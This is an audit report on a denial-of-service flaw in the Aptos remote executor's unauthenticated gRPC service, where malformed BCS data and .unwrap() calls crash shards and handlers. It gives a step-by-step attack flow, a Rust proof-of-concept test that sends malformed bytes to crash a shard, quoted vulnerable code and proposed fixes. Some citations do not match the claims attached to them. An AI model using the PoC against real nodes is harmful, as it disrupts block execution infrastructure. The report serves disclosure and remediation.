# Audit Report

## Title
Unauthenticated Remote Executor Service Crash via Malformed BCS Deserialization Leading to gRPC Handler Panic

## Summary
The remote executor service's gRPC network layer lacks authentication and uses improper error handling (`.unwrap()`) in multiple critical paths. An attacker can send malformed BCS-encoded messages to crash executor service shards, causing their channel receivers to be dropped. Subsequent messages to the crashed shard trigger a panic in the gRPC handler due to sending on a disconnected channel, leading to denial of service on the remote block execution infrastructure.

## Finding Description

The vulnerability exists in the interaction between three components:

1. **No Authentication on gRPC Service**: The `GRPCNetworkMessageServiceServerWrapper` accepts incoming messages without any authentication or authorization checks. [1](#0-0) 

2. **Panic on Disconnected Channel Send**: The gRPC handler uses `.unwrap()` when sending messages to registered handlers, which panics if the receiver has been dropped. [2](#0-1) 

The same pattern exists in the inbound handler: [3](#0-2) 

3. **Panic on BCS Deserialization Failure**: The remote coordinator client uses `.unwrap()` when deserializing incoming execution commands, causing a crash if the data is malformed. [4](#0-3) 

Additional panics exist in cross-shard message handling: [5](#0-4) 

**Attack Flow:**

**Stage 1 - Crash Executor Shard:**
1. Attacker connects to the unauthenticated gRPC service endpoint
2. Attacker sends a `NetworkMessage` with `message_type = "execute_command_0"` (or any valid shard ID) and malformed BCS data in the `message` field
3. The gRPC handler receives the message and forwards it through the crossbeam channel
4. The `RemoteCoordinatorClient::receive_execute_command()` attempts to deserialize: `bcs::from_bytes(&message.data).unwrap()`
5. Deserialization fails on the malformed data, causing a panic
6. The executor service thread crashes, dropping all its channel receivers

**Stage 2 - Crash gRPC Handler:**
7. Attacker sends another message to the same `message_type`
8. The gRPC handler looks up the registered handler for that message type (the sender is still registered)
9. It attempts to send the message: `handler.send(msg).unwrap()`
10. The send fails with `SendError` because the receiver was dropped in Stage 1
11. The `.unwrap()` causes a panic in the gRPC async handler task
12. This crashes the gRPC service or causes RPC failures

**Affected Code Paths:**

The NetworkMessage protobuf definition shows no validation is performed: [6](#0-5) 

The remote executor service creates the network controller without security measures: [7](#0-6) 

## Impact Explanation

**Severity: High**

This vulnerability meets the High severity criteria per the Aptos bug bounty program:
- **Validator node slowdowns**: Crashing the remote executor service prevents sharded block execution
- **API crashes**: The gRPC service crashes on subsequent messages after Stage 1

**Impact Scope:**
- Denial of Service on remote block execution infrastructure
- Block processing failures when sharded execution is enabled
- Potential validator performance degradation if this service is critical to their operation

**Important Note:** This vulnerability only affects nodes that explicitly enable remote executor sharding via the `--remote-executor-addresses` configuration flag. This is not enabled by default and is primarily used for performance testing and benchmarking scenarios. [8](#0-7) 

## Likelihood Explanation

**Likelihood: Medium-High (when feature is enabled)**

**Ease of Exploitation:**
- No authentication required - attacker just needs network access to the gRPC endpoint
- Attack is trivial to execute - send malformed bytes
- Reproducible and deterministic

**Limiting Factors:**
- Feature must be explicitly enabled (not default configuration)
- Primarily affects testing/benchmarking environments
- Production validators may not expose this service or use network isolation

**Attacker Requirements:**
- Network connectivity to the executor service gRPC port
- Ability to craft gRPC requests (trivial)
- Knowledge of message type format (publicly available)

## Recommendation

**Immediate Fixes:**

1. **Add Proper Error Handling**: Replace all `.unwrap()` calls with proper error handling that logs errors and returns appropriate gRPC status codes.

```rust
// In grpc_network_service/mod.rs, line 105-108
if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
    if let Err(e) = handler.send(msg) {
        error!(
            "Failed to send message to handler for type {:?}: {:?}. Handler may have been dropped.",
            message_type, e
        );
        return Err(Status::internal("Handler unavailable"));
    }
}
```

2. **Add Input Validation**: Validate BCS deserialization before processing.

```rust
// In remote_cordinator_client.rs, line 89
let request: RemoteExecutionRequest = match bcs::from_bytes(&message.data) {
    Ok(req) => req,
    Err(e) => {
        error!("Failed to deserialize execution request: {:?}", e);
        return ExecutorShardCommand::Stop;
    }
};
```

3. **Implement Authentication**: Add authentication to the gRPC service using tonic interceptors:

```rust
// Add authentication middleware
fn check_auth(req: Request<()>) -> Result<Request<()>, Status> {
    // Implement token-based or mTLS authentication
    // Similar to patterns in indexer-grpc services
    Ok(req)
}

// In start_async()
Server::builder()
    .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
    .add_service(
        NetworkMessageServiceServer::with_interceptor(self, check_auth)
            .max_decoding_message_size(MAX_MESSAGE_SIZE)
    )
    // ...
```

4. **Fix Shutdown Race Condition**: Implement proper shutdown synchronization as indicated by the TODO comment. [9](#0-8) 

## Proof of Concept

```rust
// PoC: Crash remote executor service with malformed BCS data
use tonic::Request;
use aptos_protos::remote_executor::v1::{NetworkMessage, network_message_service_client::NetworkMessageServiceClient};

#[tokio::test]
async fn test_malformed_bcs_crash() {
    // Assume executor service is running on localhost:52200 with shard 0
    let mut client = NetworkMessageServiceClient::connect("http://127.0.0.1:52200")
        .await
        .expect("Failed to connect");
    
    // Stage 1: Send malformed BCS data to crash the executor shard
    let malformed_message = NetworkMessage {
        message: vec![0xFF, 0xFF, 0xFF, 0xFF], // Invalid BCS data
        message_type: "execute_command_0".to_string(), // Target shard 0
    };
    
    // This will crash the RemoteCoordinatorClient when it tries to deserialize
    let _result = client.simple_msg_exchange(Request::new(malformed_message.clone())).await;
    
    // Give time for the crash to propagate
    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    
    // Stage 2: Send another message to trigger gRPC handler panic
    // This will panic because the receiver is now dropped
    let result = client.simple_msg_exchange(Request::new(malformed_message)).await;
    
    // Expected: gRPC error or panic in the server
    assert!(result.is_err(), "Expected error due to crashed handler");
}
```

## Notes

**Crossbeam Channel Behavior**: The original security question asked about "known issues with crossbeam channels under high load or during shutdown." Crossbeam channels themselves are reliable and do not have issues with message loss or corruption. The actual vulnerability is in the **improper error handling** around channel operations, not in the channel implementation itself.

The `.unwrap()` calls assume channels will never be disconnected during normal operation, but this assumption is violated when:
- Components crash due to deserialization failures
- Shutdown sequences don't properly synchronize channel cleanup
- Receivers are dropped while senders remain registered

**Scope Limitation**: This vulnerability only affects deployments that explicitly enable remote executor sharding, which is not the default configuration.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L92-116)
```rust
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** secure/net/src/network_controller/inbound_handler.rs (L66-74)
```rust
    pub fn send_incoming_message_to_handler(&self, message_type: &MessageType, message: Message) {
        // Check if there is a registered handler for the sender
        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(message_type) {
            // Send the message to the registered handler
            handler.send(message).unwrap();
        } else {
            warn!("No handler registered for message type: {:?}", message_type);
        }
    }
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L86-90)
```rust
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L55-59)
```rust
    fn send_cross_shard_msg(&self, shard_id: ShardId, round: RoundId, msg: CrossShardMsg) {
        let input_message = bcs::to_bytes(&msg).unwrap();
        let tx = self.message_txs[shard_id][round].lock().unwrap();
        tx.send(Message::new(input_message)).unwrap();
    }
```

**File:** protos/rust/src/pb/aptos.remote_executor.v1.rs (L8-13)
```rust
pub struct NetworkMessage {
    #[prost(bytes="vec", tag="1")]
    pub message: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag="2")]
    pub message_type: ::prost::alloc::string::String,
}
```

**File:** execution/executor-service/src/remote_executor_service.rs (L29-36)
```rust
    ) -> Self {
        let service_name = format!("executor_service-{}", shard_id);
        let mut controller = NetworkController::new(service_name, self_address, 5000);
        let coordinator_client = Arc::new(RemoteCoordinatorClient::new(
            shard_id,
            &mut controller,
            coordinator_address,
        ));
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L203-210)
```rust
        // TODO(Manu): Handle state checkpoint here.

        // TODO(skedia) add logic to emit counters per shard instead of doing it globally.

        // Unwrapping here is safe because the execution has finished and it is guaranteed that
        // the state view is not used anymore.
        let state_view = Arc::try_unwrap(state_view_arc).unwrap();
        Parser::parse(
```

**File:** secure/net/src/network_controller/mod.rs (L152-166)
```rust
    // TODO: This is still not a very clean shutdown. We don't wait for the full shutdown after
    //       sending the signal. May not matter much for now because we shutdown before exiting the
    //       process. Ideally, we want to fix this.
    pub fn shutdown(&mut self) {
        info!("Shutting down network controller at {}", self.listen_addr);
        if let Some(shutdown_signal) = self.inbound_server_shutdown_tx.take() {
            shutdown_signal.send(()).unwrap();
        }

        if let Some(shutdown_signal) = self.outbound_task_shutdown_tx.take() {
            shutdown_signal.send(Message::new(vec![])).unwrap_or_else(|_| {
                warn!("Failed to send shutdown signal to outbound task; probably already shutdown");
            })
        }
    }
```
